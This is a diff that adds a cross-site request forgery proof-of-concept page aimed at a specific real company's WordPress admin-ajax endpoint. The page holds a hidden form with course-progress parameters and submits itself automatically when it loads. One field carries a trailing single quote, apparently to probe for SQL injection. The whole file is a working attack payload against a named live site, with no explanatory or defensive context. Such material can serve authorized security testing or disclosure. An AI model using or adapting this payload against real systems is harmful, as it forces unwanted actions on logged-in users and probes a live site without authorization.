@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF PoC</h1>
+    <form id="csrfForm" action="https://www.arkoselabs.com/wp-admin/admin-ajax.php" method="POST">
+        <input type="hidden" name="action" value="course_module_progress">
+        <input type="hidden" name="csid" value="31925">
+        <input type="hidden" name="mdid" value="32239">
+        <input type="hidden" name="redid" value="https%3A%2F%2Fwww.arkoselabs.com%2Farkose-university%2Fcourse%2Fscience-behind-credential-stuffing%2Fmasterclass%2F">
+        <input type="hidden" name="comples" value="introduction'">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
